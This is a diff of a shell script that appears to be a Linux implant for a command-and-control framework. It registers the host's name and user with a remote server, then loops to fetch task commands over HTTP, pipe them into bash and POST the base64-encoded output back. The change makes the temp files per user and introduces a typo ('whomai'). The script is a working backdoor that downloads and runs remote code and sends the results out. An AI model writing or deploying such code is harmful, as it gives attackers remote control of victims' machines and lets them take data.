@@ -13,13 +13,14 @@ name=$(curl -X POST -F eth=$interface -F hname=$(hostname) -F username=$(whoami)
 taskl="http://$ip:$port/tasks/$name/"
 resultl="http://$ip:$port/Lin-results/$name/"
 
+userfile=$(whomai)
 while :
 do  
-    curl $taskl > /tmp/tasks 
-    if [ -s /tmp/tasks ]; then
-        cat /tmp/tasks | bash > /tmp/results
-        base64 /tmp/results > /tmp/enc-result   
-        curl -X POST --data "@/tmp/enc-result" $resultl
+    curl $taskl > /tmp/tasks-$userfile 
+    if [ -s /tmp/tasks-$userfile ]; then
+        cat /tmp/tasks-$userfile | bash > /tmp/results-$userfile
+        base64 /tmp/results-$userfile > /tmp/enc-result-$userfile  
+        curl -X POST --data "@/tmp/enc-result-$userfile" $resultl
     fi
     sleep $n    
 done
